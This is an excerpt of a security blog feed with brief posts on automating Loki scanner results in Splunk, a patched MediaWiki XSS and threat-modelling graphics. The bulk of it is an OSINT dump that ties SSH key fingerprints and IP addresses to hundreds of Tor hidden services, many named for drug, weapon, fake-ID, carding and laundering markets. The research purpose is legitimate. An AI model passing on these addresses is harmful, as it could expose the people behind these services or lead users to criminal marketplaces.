20170417T01:38:59Z,WIN-8J1HPPNE2HB,WARNING,FILE: C:\Users\Administrator\AppData\Local\Google\Chrome\User Data\Default\Cache\f_0000ab SCORE: 70 TYPE: RAR SIZE: 257998 FIRST_BYTES: 526172211a0700cf907300000d00000000000000 / Rar!s MD5: b7bec1fe35e86afc5b00f2b72f684406 SHA1: c875243df43d7a0baababf7488df884acffae2f9 SHA256: f1209bbd5163a03c4543607a1ce2c69548fa6bddc977670fad845fc42216c69f CREATED: Mon Feb 06 09:11:44 2017 MODIFIED: Mon Feb 06 09:11:44 2017 ACCESSED: Mon Feb 06 09:11:44 2017REASON_1: Yara Rule MATCH: Cloaked_RAR_File SUBSCORE: 70 DESCRIPTION: RAR file cloaked by a different extension
</code></pre></div></div>

<p>and turning it into parsed key/value pairs that can be used to run reports
that show all Loki Scan results that have a 70% confidence level and above, or
to fire an alert on confidence levels of 100% :</p>

<p>Loki Parsed Logs</p>

<p><strong>Conclusion</strong><br />
This is great, but, really, so what? What can we do with this information? The
value in this post is in creating the ability to automate a manual task across
your your enterprise. You no longer have to manually run the Loki APT scanner
on each system across your environment and parse through the results for
possible issues. Automate, explore, expand, exploit, and exterminate. With a
sea of open source security tools that work well on a manual process, this
solution can be an excellent method to provide a fresh insight into the
workings, and malevolent workings, of an enterprise.</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Threat Hunting"/>
    <category term="Incident Response"/>
    <category term="APT Detection"/>
    <category term="Open Source Security Tools"/>
    <category term="Splunk"/>
    <category term="IOC Scanning"/>
    <category term="Automation"/>
    <category term="YARA"/>
    <category term="Threat Intelligence"/>
    <category term="Windows Security"/>
    <summary type="html"><![CDATA[One tool that has caught my interest is the [Loki APT scanner]]></summary>
  </entry>
  <entry>
    <title type="html">Serious XSS affecting Wikipedia</title>
    <link href="https://www.securesql.info/2017/09/08/wikipedia-xss/" rel="alternate" type="text/html" title="Serious XSS affecting Wikipedia"/>
    <published>2017-09-08T00:00:00-07:00</published>
    <updated>2017-09-08T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2017/09/08/wikipedia-xss</id>
    <content type="html" xml:base="https://www.securesql.info/2017/09/08/wikipedia-xss/"><![CDATA[<p>Cross-site scripting (XSS) vulnerability in thumb.php in MediaWiki before
1.23.10, 1.24.x before 1.24.3, and 1.25.x before 1.25.2 allows remote
attackers to inject arbitrary web script or HTML via the rel404 parameter,
which is not properly handled in an error page.</p>

<p>[ Above was an interesting XSS affecting all of Wikipedia and MediaWiki
software.   It was found during manual code review.  Not much to be said about
it other than failure to validate and / or sanitize input.  Great response by
the MediaWiki development and Wikipedia Security team!</p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Vulnerabilities"/>
    <category term="Web Security"/>
    <category term="XSS"/>
    <category term="MediaWiki"/>
    <category term="Wikipedia"/>
    <category term="Disclosure"/>
    <category term="Security Patching"/>
    <category term="Manual Code Review"/>
    <summary type="html"><![CDATA[XSS vulnerability in thumb.php in Wikipedia Mediawiki]]></summary>
  </entry>
  <entry>
    <title type="html">Defense Against the Dark Arts</title>
    <link href="https://www.securesql.info/2017/09/07/irony-is-not-lost-on-me/" rel="alternate" type="text/html" title="Defense Against the Dark Arts"/>
    <published>2017-09-07T00:00:00-07:00</published>
    <updated>2017-09-07T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2017/09/07/irony-is-not-lost-on-me</id>
    <content type="html" xml:base="https://www.securesql.info/2017/09/07/irony-is-not-lost-on-me/"><![CDATA[<p>Thankfully, Naurus has produced a useful infographic to understand the variety
of malicious entities.  While it is not all inclusive, it suffices to help one
quickly prototype simple threat models.</p>

<p><img src="https://securesql.info/images/image-
asset.jpeg" alt="" /></p>]]></content>
    <author>
      <name>John W8MEJ Menerick</name>
    </author>
    <category term="Threat Modeling"/>
    <category term="Cybersecurity"/>
    <category term="Infographics"/>
    <category term="Adversary Types"/>
    <category term="Security Awareness"/>
    <category term="Cyber Threats"/>
    <category term="Prototyping"/>
    <category term="Security Fundamentals"/>
    <summary type="html"><![CDATA[Thankfully, Naurus has produced a useful infographic to understand the variety of malicious entities. While it is not all inclusive, it suffices to help one quickly prototype simple threat models.]]></summary>
  </entry>
  <entry>
    <title type="html">Walking the Dark Deep Web</title>
    <link href="https://www.securesql.info/2017/04/05/fall-of-an-empire/" rel="alternate" type="text/html" title="Walking the Dark Deep Web"/>
    <published>2017-04-05T00:00:00-07:00</published>
    <updated>2017-04-05T00:00:00-07:00</updated>
    <id>https://www.securesql.info/2017/04/05/fall-of-an-empire</id>
    <content type="html" xml:base="https://www.securesql.info/2017/04/05/fall-of-an-empire/"><![CDATA[<p>During Black Hat, BsidesLV, and Defcon, I ended up having a quick chat with
Justin Seitz about his nifty OSINT automation.  I decided to take his data
sets and enrich the data with additional metadata and diamond modeling.   I
will be pivoting on each indicator to tease out unexpected patterns.</p>

<p>It was interesting what we have uncovered.  Here are the raw results from the
basic 7,000+ identified hidden sites based upon ssh keys.  Additional unique
meta-data identifiers and indicators will be pushed to <a href="https://github.com/lordappsec/datasets/tree/master/osint">the osint
repo</a></p>

<blockquote>
  <p>“[!] Hit for 58:de:72:d5:5b:4b:51:d4:9a:35:b9:e4:ff:40:77:a3 on
107.5.236.121 for hidden services hiotuxliwisbp6mi.onion<br />
[!] Hit for e0:1e:a3:26:a6:c5:8e:0b:e9:34:e9:8f:7d:6e:c6:24 on 78.47.134.6
for hidden services apkx44pmf7fyd63e.onion<br />
[!] Hit for e6:23:75:6c:b0:76:d6:c0:97:3d:5e:ea:cc:fa:4e:31 on
151.236.219.73 for hidden services atdctrpaxt3pl5ir.onion<br />
[!] Hit for e6:23:75:6c:b0:76:d6:c0:97:3d:5e:ea:cc:fa:4e:31 on
2a01:7e00::f03c:91ff:fe69:901f for hidden services atdctrpaxt3pl5ir.onion<br />
[!] Hit for b5:9a:6c:f9:ef:33:61:08:86:99:f9:64:04:22:1b:38 on 178.84.14.207
for hidden services ejinouevsdwsjdbb.onion</p>

  <p>[!] SSH Key f7:2f:6f:f5:af:19:fd:a6:04:19:98:07:4a:d6:ef:70 is used on
multiple hidden services.<br />
 hb6y4jt4pnfb52v6.onion<br />
 hackslciome4eshp.onion<br />
 grjfadb7bweuyauw.onion<br />
 anna4nvrvn6fgo6d.onion<br />
 7aiwdmr4oojlegdz.onion<br />
 wikizkuwgh5k2ftl.onion<br />
 233lidifqbunokht.onion<br />
 gewaltics7teim6i.onion<br />
 linkzbyg4nwodgic.onion<br />
 oqei4mbjh33uywsb.onion<br />
 spermacuhioqhopr.onion<br />
 bigsexzwankdb27a.onion<br />
 z25ub7elk47ca2gj.onion<br />
 7ln4cubdfhs7tvtz.onion<br />
 btcjaww2avywtadz.onion<br />
 grannytnglrvaaf7.onion<br />
 zoo6cxl4rtac3jxw.onion<br />
[!] Hit for f7:2f:6f:f5:af:19:fd:a6:04:19:98:07:4a:d6:ef:70 on 95.215.46.188
for hidden services
hb6y4jt4pnfb52v6.onion,hackslciome4eshp.onion,grjfadb7bweuyauw.onion,anna4nvrvn6fgo6d.onion,7aiwdmr4oojlegdz.onion,wikizkuwgh5k2ftl.onion,233lidifqbunokht.onion,gewaltics7teim6i.onion,linkzbyg4nwodgic.onion,oqei4mbjh33uywsb.onion,spermacuhioqhopr.onion,bigsexzwankdb27a.onion,z25ub7elk47ca2gj.onion,7ln4cubdfhs7tvtz.onion,btcjaww2avywtadz.onion,grannytnglrvaaf7.onion,zoo6cxl4rtac3jxw.onion<br />
[!] SSH Key f0:91:3c:b9:33:46:3c:2a:cf:bd:50:ff:58:d3:9c:99 is used on
multiple hidden services.<br />
 daemon4jidu2oig6.onion<br />
 comments.daemon4jidu2oig6.onion<br />
[!] Hit for da:aa:43:bc:2b:ca:2e:9e:bf:57:96:6b:26:90:ad:d5 on
80.110.207.160 for hidden services iqij37quu7cvaktl.onion<br />
[!] SSH Key 96:66:c7:f3:a5:da:1d:4d:52:25:fb:84:56:d3:57:c3 is used on
multiple hidden services.<br />
 psii2pdloxelodts.onion<br />
 git.psii2pdloxelodts.onion<br />
[!] SSH Key 67:ce:9a:30:85:c3:53:db:a3:93:58:d1:c2:dc:f0:b3 is used on
multiple hidden services.<br />
 answerstedhctbek.onion<br />
 chchchiasaeljqgs.onion<br />
[!] Hit for 8e:67:85:f5:13:f2:dc:dc:74:f3:aa:b3:fb:ca:04:80 on 80.81.243.153
for hidden services uf2fjijpodfsv4fb.onion<br />
[!] SSH Key 3f:5c:e1:63:6e:fc:1b:03:7c:71:67:aa:8c:da:32:0b is used on
multiple hidden services.<br />
 spacechadxxpkf6t.onion<br />
 coinpigih6i444lm.onion<br />
 braveb6iyacflzc2.onion<br />
 grams7ebhssrhdf4.onion<br />
 stoned3dzzhnoe4r.onion<br />
 cocahze7fqy4qwwx.onion<br />
 paypalfhnohwoy6b.onion<br />
 bluemoon4vpzulpv.onion<br />
 weapon5cd6o72mny.onion<br />
 wallet6qmtkcub2e.onion<br />
 nlgrowc3xywaj2zn.onion<br />
 SpaceChadxxpkf6t.onion<br />
 eucannapggbtppdd.onion<br />
 bitmixegkuerln7q.onion<br />
 mystorew25hgytln.onion<br />
 weed46fkpfzc3lvi.onion<br />
 countermltd42g4x.onion<br />
 sinmedxxqpfh6ykc.onion<br />
 cmarketsiuhtiix5.onion<br />
 djn4mhmbbqwjiq2v.onion<br />
 cvendorj6vnr3thv.onion<br />
 bitmixergv5vvbza.onion<br />
 payshielgjp4lsmx.onion<br />
 electrotev3tgo2p.onion<br />
 blackph5fuiz72bf.onion<br />
 swemedsnbw2dhlps.onion<br />
 bitstorenctdwhmo.onion<br />
 fairtramv73r6qva.onion<br />
 foggedd3mc4dr2o2.onion<br />
 foggeddq65qveh2g.onion<br />
 btcmixxihego4qyg.onion<br />
 safeslwq7q7lsvmw.onion<br />
 armorykr2fqsulxk.onion<br />
 weedsragjdyuimdm.onion<br />
 fakeids5bps3l6qb.onion<br />
 mobileay2syyw6qf.onion<br />
 gnshpojuxrioibud.onion<br />
 bryemnetihwcflrs.onion<br />
 digitalwiwht2liv.onion<br />
 tipstervvnn33qpb.onion<br />
 blacknwico2pm2ax.onion<br />
 mixer6nyvxalc252.onion<br />
 fixedlwgc3burzts.onion<br />
 megadnmnuogrn4ik.onion<br />
 telavivguw3ey5wh.onion<br />
 bauncutkrij26z3w.onion<br />
 cleancondgqja34b.onion<br />
 fogcorevmbk2jfqv.onion<br />
 gunsganjkiexjkew.onion<br />
 clonedc2yqbcs7st.onion<br />
 dedopedhvmcsxylb.onion<br />
 fogwalletgw4g2nc.onion<br />
 laundryzlzgnni4n.onion<br />
 cityzenp4d2eytjh.onion<br />
 drkseidwayn6uc5x.onion<br />
 bryemnekeevtpomb.onion<br />
 laundrymy244rcwn.onion<br />
 walletbjvdecnjgp.onion<br />
 mixerrzbgcknjzk4.onion<br />
 cleancoikmh6uamc.onion<br />
 cardsp2g54ybnvpg.onion<br />
 amazingd64el2zty.onion<br />
 cocain2xkqiesuqd.onion<br />
 armoryohajjhou5m.onion<br />
 applesf6emggp2pz.onion<br />
 maghrebwzbkucctg.onion<br />
 bitmixecjf5ofbbj.onion<br />
 pharma5jbbmwjoo3.onion<br />
 acteamygnwgs7zpt.onion<br />
 ccpalym5nu3elh5y.onion<br />
 grimlockdlsgupyj.onion<br />
 btcmixhnpqlpfacx.onion<br />
 BitMixergv5vvbza.onion<br />
 replicaf6cjadwxs.onion<br />
 drugss5mif4vrbws.onion<br />
 grams7eo7mkagczs.onion<br />
 hosting6iar5zo7c.onion<br />
 3d7gjzc6utf7soq7.onion<br />
 choicecbtavv4cax.onion<br />
 gl75awtvsmp2ofe6.onion<br />
 thevaultwlxd7lrg.onion<br />
 j5ehssrshpxpdkto.onion<br />
 hackeroql4l2mejs.onion<br />
 ccsale4qgjgnt4xi.onion<br />
 limaconzruthefg4.onion<br />
 m2cylfgzmxwauyqz.onion<br />
 wikitorcwogtsifs.onion<br />
 psyched25pydrgul.onion<br />
 ggshopx7iixfkb5p.onion<br />
 amazoncskufvcvmo.onion<br />
 fakeidjgjmadhyr6.onion<br />
 ukpasspprmwaqrsd.onion<br />
 countuwelx4r7qi5.onion<br />
 countrfoioed4ckx.onion<br />
 bmreload54caekze.onion<br />
 mystorea4mbkgt76.onion<br />
 buybtcstbl2d3igz.onion<br />
 wikihiddkz5w3hfg.onion<br />
 bitphar76n5t3qag.onion<br />
 cards5yvy44gucvo.onion<br />
 fakeidskhfik46ux.onion<br />
 chainspz7gu33k77.onion<br />
 cannabi4ewmalq3g.onion<br />
 cardsunwqrzhg5cw.onion<br />
 pirateceo5dz3q4b.onion<br />
 carddumpa36spoya.onion<br />
 luckp47s6xhz26rn.onion<br />
 footballthj7o5w3.onion<br />
 ccgurujnwe55avst.onion<br />
 mollyworh4524fop.onion<br />
 ma3lisqktqdlg3t6.onion<br />
 payshldjgsfjhaj2.onion<br />
 guttenbdoe4mzk6k.onion<br />
 akvilonom27p5hvb.onion<br />
 rothminr5wgew3f4.onion<br />
 market3y77xnmhwm.onion<br />
 footb6kqariohxcf.onion<br />
 drugszun7tvsgsaa.onion<br />
 blenderri3sud4e6.onion<br />
 btcwash7jmra3hgm.onion<br />
 passporxakpmzurx.onion<br />
 blenderi54mbtyhz.onion<br />
 kplatypxb2aecznv.onion<br />
 cardsm4fgcw5po3v.onion<br />
 slkushhma4pmfirg.onion<br />
 kamagraujn45ja5w.onion<br />
 amazonfkuuy6g3ou.onion<br />
 celebfcf5vupvcbh.onion<br />
 bitblenz4rleaisr.onion<br />
 vendorcugc6oppvb.onion<br />
 gbpoundlnlrgewcc.onion<br />
 fakebillkelmwaos.onion<br />
 pistolcqex2ecr5r.onion<br />
 directdal7bourmy.onion<br />
 hackerrljqhmq6jb.onion<br />
 rubbishs4sfawpyf.onion<br />
 gunsdtk47tolcrre.onion<br />
 loundryslz2venqx.onion<br />
 platypusxchhwv6z.onion<br />
 smokerhv5hlklzh2.onion<br />
 betcoinahk4j27yb.onion<br />
 bitstfya5jxnujtr.onion<br />
 russianyhluzsk53.onion<br />
[!] SSH Key 2d:c8:b8:02:9a:8a:19:d3:a2:ad:b9:ec:01:f4:cf:ff is used on
multiple hidden services.<br />
 dtavn4vwaaib4ebh.onion<br />
 ukjlovmbuw25gddi.onion<br />
[!] SSH Key c1:35:81:62:33:fa:ea:e9:78:d0:e5:e7:d1:10:69:f8 is used on
multiple hidden services.<br />
 antifa.torpress2sarn7xw.onion<br />
 torpress2sarn7xw.onion<br />
 antiscambrasil.torpress2sarn7xw.onion<br />
 notoriedadefeminista.torpress2sarn7xw.onion<br />
 lucy.torpress2sarn7xw.onion<br />
 salehistoire.torpress2sarn7xw.onion<br />
 arcanum.torpress2sarn7xw.onion<br />
[!] SSH Key 81:cb:d2:d4:f7:e4:8c:6b:1a:92:07:42:cd:e2:42:23 is used on
multiple hidden services.<br />
 gmpbs6wtza7il3s2.onion<br />
 lkje57k3u5flc7rd.onion<br />
 zbgyykbytualmgp2.onion<br />
 3rwweipfxkp37efd.onion<br />
 wiv7tzvb2jmmpc7b.onion<br />
 ayeuj3omyh7x5imq.onion<br />
 wfamomohy7kea3wx.onion<br />
 hbcdif2xsajkvxwr.onion<br />
 tfsippli7jdpgt6a.onion<br />
 xmmvzaecdwq3wqln.onion<br />
 gyfwhn5mewagwr6v.onion<br />
 myu2ececidqq5zfy.onion<br />
 64q5lin7ufe3ep6s.onion<br />
 lpbiqdl2ix3547mg.onion<br />
 nmq55jyhwbni2wjf.onion<br />
 i5rbhal2iegfqzni.onion<br />
 kyqrrmdqib7kp6fe.onion<br />
 plgqhtlw2b26rc7n.onion<br />
 bwlewg3lvaohbue2.onion<br />
 grthscl3rsgvfcu2.onion<br />
 nqeycgvzjmntmpnu.onion<br />
 hitmanvcwgzb3ni5.onion<br />
 nt4f7fzcjoe3f5aj.onion<br />
 hti7xv2qqpbzx5rx.onion<br />
 ewaatttmeo66jxww.onion<br />
 afpcbwv4ynjhrzes.onion<br />
 kjtdbbjvkde5463f.onion<br />
 4sn4rxs727d4ybxw.onion<br />
 bi5fzotoo7v7rawi.onion<br />
 ogqtcakvzjnq5xm4.onion<br />
 wfl2rovpgo2dkgyr.onion<br />
 3uxav77s57e3yjze.onion<br />
 gox7on5trpbybzsn.onion<br />
 sqcx3njizyjwa7fp.onion<br />
 d46irpoo6xljwysz.onion<br />
 rqwc2pyhxuxll6br.onion<br />
 gmts3xxfrbfxdm3a.onion<br />
 eypg6qqgebkfbfph.onion<br />
 xt27a47leq6noynq.onion<br />
 nk4nyjd37xh5r3od.onion<br />
 pdvdftayfhljdbr7.onion<br />
 awtdxp5dsh7cy5zt.onion<br />
 hkisl3373gs67icm.onion<br />
 7e3y4emabflhgofh.onion<br />
 np6zfvsfncn6vivz.onion<br />
 snn2x7ivovcfaazn.onion<br />
 5ajnmjhtmxea5gah.onion<br />
 ylmpxrmebx3prupo.onion<br />
 zm5bh4xrm6r3cpnp.onion<br />
 i2dem5bn2mcetkhf.onion<br />
 ynjnx6gnmejcqgso.onion<br />
 tpyq3zobimshvawx.onion<br />
 gvw2qdct4rk56sid.onion<br />
 facj5l7pgk6ekxgw.onion<br />
 5jmlvxm6exwnn5dl.onion<br />
 iftjwny3rauabpzg.onion<br />
 jxi3baz2c7z6ky4m.onion<br />
 4yiyky5kppldda4y.onion<br />
 xt3kjs2pyp65dhri.onion<br />
 f5riexbpirf57fll.onion<br />
 35gxn3ajozhnuzjv.onion<br />
 7m6cjcer6won533c.onion<br />
 anpjhr2flqtbl55z.onion<br />
 lzmok4fso6uomfh2.onion<br />
 qodfuk3wo73fvw7p.onion<br />
 hack2zddrgbtk5hp.onion<br />
 kabxvjhao5ikmldy.onion<br />
 kxydaspaqnotrg62.onion<br />
 gbrbtwawgum7hz3g.onion<br />
 xxcpxxxsah4c6akb.onion<br />
 4zyple6oftjaylqx.onion<br />
 kxr7jaurjuuep65c.onion<br />
 ttydhibydkh6vr7r.onion<br />
 rjksm2jblud66qdl.onion<br />
 ed65yryhct72apcw.onion<br />
 wovu4upzvh37ci3e.onion<br />
 rhqznyizybeqpemh.onion<br />
 xigwdw2vnjxyp5rq.onion<br />
 e4gsrcysdyxlzjur.onion<br />
 j6bvx2hdqjnnqv2l.onion<br />
 jjrbfzv3f2vff7fb.onion<br />
 iyfyeqrwpjjgcxzp.onion<br />
 r2rzet3cauvfbxb6.onion<br />
 7exlea5rskd5itvb.onion<br />
 w4mrsr4gvijw64un.onion<br />
 ktfe7gbuymu77xrm.onion<br />
 b3vllrtxx3rczplv.onion<br />
 gbghyriq6jdi5vdl.onion<br />
 ujd5yqkicvbbqjag.onion<br />
 sbr6rawu5f7ibz42.onion<br />
 ehfkh2p7n3yhizk3.onion<br />
 idrbmyhudzfp6hng.onion<br />
 vuovfy3qrvv4q7f2.onion<br />
 7ialunk26nexs5bl.onion<br />
 4px7xapjbj6xxkql.onion<br />
 bj34sdmkveikr5bm.onion<br />
 bpj5svci6wqcreiz.onion<br />
 askt4maf7m4buo3j.onion<br />
 7gcz7b6xkhddgx4a.onion<br />
 jwuolm4mmcf6snio.onion<br />
 6332a4ptorpxu7gc.onion<br />
 m3kraxemky2tyyrb.onion<br />
 xk7kxek7vbh4dulo.onion<br />
 ze6ms22z3m3h7q2w.onion<br />
 jsa2o25tqk36itu7.onion<br />
 fczo4gjdvahyg72c.onion<br />
 ocyndkuxsk2opbh5.onion<br />
 v3gajvwgt3axrlqz.onion<br />
 vl7zg2cv4tv2byor.onion<br />
 bl2seac2zm2afjpz.onion<br />
 btcxlo2wi6nu3gym.onion<br />
 ftw75wawi3slh7oc.onion<br />
 dksl2cqzfyqidloi.onion<br />
 okxs7tdgngip7vct.onion<br />
 qv3wxjx3y2if56ge.onion<br />
 2njbjo44mnszjndj.onion<br />
 7dd7ygnfudbmef66.onion<br />
 45d4v4cycom34e3r.onion<br />
 apply2hae44hx37c.onion<br />
 cilkqciq2mx5b634.onion<br />
 jbcyg47y6b72tawl.onion<br />
 xyu4v2ltxhomapav.onion<br />
 z6m3b572iceci6kg.onion<br />
 4cgccaa7kiaxhvj4.onion<br />
 yzzten64i77zho65.onion<br />
 zjrkme6scst7wju4.onion<br />
 uc5wx66rdttl6azv.onion<br />
 2fuuch6l5n6nrrjo.onion<br />
 bae4kqjjpizil7gc.onion<br />
 xym5qdjlqrpq2rj7.onion<br />
 l56lw4glo555tr7j.onion<br />
 owxsfmv5dcpxgs77.onion<br />
 hmqtynkwjpg3gjqw.onion<br />
 6o2n6kyvlycon5sp.onion<br />
 zpc3tlosrndi4gxl.onion<br />
 fhostingesps6bly.onion<br />
 pyro5l7wciwhv2sa.onion<br />
 6wcszw2gansh6gaa.onion<br />
 kvexpnd4yuejicjv.onion<br />
 buyhbodq5mdvxod2.onion<br />
 beu2mvfh7z5kimnv.onion<br />
 gipg4nhonsytlvq5.onion<br />
 zpffh4wwhuu3ndxm.onion<br />
 h6oc45xcwzae6vak.onion<br />
 fom2en2e2knxvsah.onion<br />
 umo3ndfmvdmfz3ju.onion<br />
 6bxeuoy2yjtbdi4h.onion<br />
 ztvcyfnj6fvvuklj.onion<br />
 pwoah7fbs7odowr6.onion<br />
 yjtnvcnm4qn3qfwn.onion<br />
 hbjxohsz7ix5w6b4.onion<br />
 6oigxuhflvz73jy6.onion<br />
 evmf7yfl5b5zfjnk.onion<br />
 hyjfwbfyo5ky237j.onion<br />
 cccfaqfv4vudb3tx.onion<br />
 tdqr2766vdu3525l.onion<br />
 ppccaaix7jtxnl2w.onion<br />
 q2gi24dzc2wjspxn.onion<br />
 v3hsscb4thvyz7ss.onion<br />
 hworfpr3wxcbrr7v.onion<br />
 44ukmvcvddphurj3.onion<br />
 lt6ychu3k6fx3apu.onion<br />
 dk6v6btbp4mfcp4c.onion<br />
 djnt3b26olqdlaj7.onion<br />
 irushkvnas2csbj5.onion<br />
 osd5b4zkpsctapbb.onion<br />
 rd7vxbhvzsg2acpr.onion<br />
 bfclsxyqtnwkrr2l.onion<br />
 poldoxhh7h6zxgld.onion<br />
 kksksdqu74jekkei.onion<br />
 pcrkhk7uwf5gbqup.onion<br />
 hisuq2phsjjj45tl.onion<br />
 dvhxp4kztclgwoyy.onion<br />
 2xcvidsvg3w3sjv5.onion<br />
 pornpetscauod443.onion<br />
 sjpphtocast5wgf2.onion<br />
 opiate2mhwjo563v.onion<br />
 leroy67eeqjiwbzi.onion<br />
 ue552o65yhwxym3u.onion<br />
 klvietpf5t2vorh4.onion<br />
 2222222iqv7qzecz.onion<br />
 ayllpiejfothmgsc.onion<br />
 dsio473bad7pbkvs.onion<br />
 ccgoldchgewmd5kz.onion<br />
 x646m3jpqymtihpp.onion<br />
 vw2cx44wgruae4ds.onion<br />
 ri73dtqkn3zmxzvn.onion<br />
 ohnhsuercp2uscpl.onion<br />
 zomyz24hxqabs7jb.onion<br />
 7kuxpsodhm6kmeb6.onion<br />
 mrtupkpmauxnl377.onion<br />
 cxmpmjefnymbdm7p.onion<br />
 fuckmev5vcaoj6mr.onion<br />
 xoi7qasv6mixypql.onion<br />
 ltqy2oonz7iwu7u7.onion<br />
 desconzts5unl4wi.onion<br />
 dcbezdblflyb74xz.onion<br />
 igawdmjosnbjcwxv.onion<br />
 mvav4lzqcnbr4wss.onion<br />
 fh63ozjoouyh7iuu.onion<br />
 yyc3giav3hudtthb.onion<br />
 7lk3im6257tmmjv2.onion<br />
 coins47q6jmpomvg.onion<br />
 uc2kdz7vkrwl4d2u.onion<br />
 mqr2ms3nxqbp5sdp.onion<br />
 e253arujkuz4pi7v.onion<br />
 222usdkjahfkblmn.onion<br />
 nyn7tkes4ghu4ikn.onion<br />
 cccloneifxkc2mtn.onion<br />
 qwcsygsvu3nljroo.onion<br />
 2pdomepcdltqck2t.onion<br />
 pqr4o2ku7cyroytq.onion<br />
 mgeuhbhetngzxpmq.onion<br />
 spp4nwc7yhpn5nhm.onion<br />
 lm4raazrxb4xx73o.onion<br />
 p4gcaja32uq4zivi.onion<br />
 ywp7ilvkznwcmrjh.onion<br />
 djw45b6vsusffo34.onion<br />
 hf4ktwovvkmjwzzy.onion<br />
 cnro2qeixctfjgjr.onion<br />
 rep2qg6l2eevm5db.onion<br />
 mzs27lf43wze73py.onion<br />
 ukdwinvgl3rinw7k.onion<br />
 vjrqieblq36nmqgs.onion<br />
 qu3luqplnrd664z5.onion<br />
 a6zakk4fegj3pql5.onion<br />
 lvx7wmyixoyo2lom.onion<br />
 klpsyuc4hv3ahzby.onion<br />
 quhhje7as2b74nmi.onion<br />
 spotifyzufnhf4vx.onion<br />
 q5itwu6jdfxs2ha2.onion<br />
 bc6zrm5irv7yqapm.onion<br />
 fb4zgbsny5frwwzy.onion<br />
 zohpr7sebrxtpbl2.onion<br />
 2rleo6mubxzy3uky.onion<br />
 wtlpzaexwuhm2kcv.onion<br />
 zdt3dmeoshh7j6kb.onion<br />
 p6jnocpfhms22dbt.onion<br />
 f6xtnh7l6ddsfzgy.onion<br />
 jym35f5wxwa4ap24.onion<br />
 geeks5xxzfr72ead.onion<br />
 lbdbr3r65mdlabqm.onion<br />
 6y3222to7fcm3zjt.onion<br />
 wk2mlyohayo755ay.onion<br />
 ukofe6me4fkhoywe.onion<br />
 7swajbltyibfgljq.onion<br />
 wb5lztue723enfiu.onion<br />
 ptg74kttfh6r6xmg.onion<br />
 owjwgpximbdhtdgs.onion<br />
 x3nznh7wmzxm4vaa.onion<br />
 cs3d6bclcnbkq4wz.onion<br />
 enm6dnhmdshw3fmw.onion<br />
 animalirgsuecrvn.onion<br />
 ld5meqx5wkaxmyif.onion<br />
 j5cbzrq6nemxz3id.onion<br />
 wnd3lofg4awtamsj.onion<br />
 iroqjwys5rx6wjww.onion<br />
 7uj5ubxjzj2w3lqo.onion<br />
 wsvfwo7hew2asgx2.onion<br />
 bafvprdmntqz3la2.onion<br />
 e2je6by5lfxk3oac.onion<br />
 lkw2rvo2flzdalb4.onion<br />
 d5c6kvvaxvjlkzkw.onion<br />
 i6glcgz4bwqwarhb.onion<br />
 yyilonb36nqdycov.onion<br />
 c7es4nycw355nx6v.onion<br />
 xpx7kf6bo63bae2o.onion<br />
 xcvwjwwnzjh3og2s.onion<br />
 gotchafjkmcqdz2x.onion<br />
 hforum53umdxo7b3.onion<br />
 i55cn6wxv4nnhf33.onion<br />
 c7hal6caa6ma6thp.onion<br />
 d7p243r3vx32w44r.onion<br />
 euaqlxjnf6pb5k7r.onion<br />
 y4qmucdt6rcjhyx5.onion<br />
 lwgt62wyuk5fsyar.onion<br />
 3uantgmzv6a76gv5.onion<br />
 aglrnbqvlhepxzgu.onion<br />
 4hojqdetomspo54r.onion<br />
 ahmygmocjnzstr43.onion<br />
 x35fpxqbgelkcouz.onion<br />
 wwls4z2xz6va6usq.onion<br />
 33ohdtwz5vd2g3w7.onion<br />
 7blkm7heoz7pym3l.onion<br />
 hxvhiii4lgxxltvj.onion<br />
 44liaxx5askfabtu.onion<br />
 zprx6r7c667ku25n.onion<br />
 ab6bp37gsthaqsc3.onion<br />
 girls4okc5oemeel.onion<br />
 yhptqypn2ydcloy2.onion<br />
 asc3mgbp7qmsjx2v.onion<br />
 oawsl7i4wq2pnipe.onion<br />
 ffcos5cxbswsl4yr.onion<br />
 gddbmbz7flws7dgf.onion<br />
 njqmgruntvo5m7cl.onion<br />
 phmsga42i3bom7xu.onion<br />
 ll7wjdf5rkswdjgc.onion<br />
 hkkduic5xpmhw3s6.onion<br />
 netflixyummrhppw.onion<br />
 yf5zmmgn55bkob54.onion<br />
 xwxhdkagplch7z7j.onion<br />
 7xrwxoo673a37aac.onion<br />
 vef2lakdyq3gg2qq.onion<br />
 ybtpdkqy7allqlo3.onion<br />
 x5e6z6es7eui5l6z.onion<br />
 networks3q34kfkg.onion<br />
 3uxw5j5pdqvhkwns.onion<br />
 cig7hq7ebwfvusqj.onion<br />
 secure4qtapgbhvq.onion<br />
 z7pni65w4axnqztv.onion<br />
 b6ba5h5jkknff7nc.onion<br />
 sxunluwmcuhs4van.onion<br />
 4bp7banheiovkzyz.onion<br />
 kn2mprdn3rnikcdn.onion<br />
 hnzhmdp56sbjqctp.onion<br />
 janos54dvrchuren.onion<br />
 pwv7a2stnltf6ixn.onion<br />
 affiivrakpu7ltz7.onion<br />
 nisxa3tzqu4abmpu.onion<br />
 hyqjy2qoawqb2txc.onion<br />
 t6dnygr6ezgtvz6q.onion<br />
 2kfnklpiuikmnzy7.onion<br />
 cpwkonvvh6cvfelt.onion<br />
 qolkkd32hevzlmwx.onion<br />
 uv6e44zwqcbgwf5c.onion<br />
 ypbzi3ln33bcqvny.onion<br />
 hmktklpgj2xrq3jy.onion<br />
 22pl2l2jfxqckoco.onion<br />
 relicd7edydsci7u.onion<br />
 burnhhsk4zfmr566.onion<br />
 364wugxkjqseyb46.onion<br />
 3ukrbkcmcecurruj.onion<br />
 ffnvwnmp7uqyfufk.onion<br />
 4gema5eutwxomdvf.onion<br />
 qyi7cvzf37uplsof.onion<br />
 pkatdlontgj7jk23.onion<br />
 gcf42ph6vjzfmeuz.onion<br />
 v7cwgookb7vbgw53.onion<br />
 yfvukhzjcr57zlum.onion<br />
 sociala2zz7ys2ji.onion<br />
 bvsgkje34nowf4jm.onion<br />
 ltqymqqqagc3ena3.onion<br />
 hackedbtck7gzh7o.onion<br />
 2if22lq4wgdsep4e.onion<br />
 vmd7t3ltnkqgrpby.onion<br />
 g3c377zsrvwj63zn.onion<br />
 y5ox6e54nsuudahi.onion<br />
 czvbosrjkm6isbw2.onion<br />
 epyahb2pvqbaglre.onion<br />
 oy4egyrunwuloiw7.onion<br />
 5o45eus3xqjogzen.onion<br />
